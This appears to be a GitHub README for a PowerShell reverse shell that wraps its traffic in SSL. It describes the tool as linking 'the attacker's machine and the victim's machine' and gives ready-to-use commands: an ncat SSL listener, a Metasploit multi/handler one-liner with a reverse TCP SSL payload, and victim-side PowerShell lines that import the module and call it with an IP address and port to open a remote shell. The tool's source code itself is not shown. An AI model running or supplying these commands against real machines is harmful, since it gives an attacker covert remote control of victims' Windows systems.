# PowerShell-SSL-ReverseShell
This is a reverse shell written in PowerShell that uses SSL communications between the attacker's machine and the victim's machine. Made with inspiration from [samratashok/nishang Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [PowerShell-reverse-shell](https://github.com/martinsohn/PowerShell-reverse-shell)


## Usage

### Attacker Machine

- #### Ncat
```bash 

❯ ncat --ssl -lnvp 4646

```

- #### Metasploit
```bash 

❯ msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set lhost 192.168.254.226; set lport 4646; set ExitOnSession false; exploit -j"

```


### Victim Machine
```powershell 

PS > Import-Module .\GetShellSSL

PS > GetShellSSL -Reverse -IPAddress 192.168.254.226 -Port 4646

```

#### Demonstration
![]()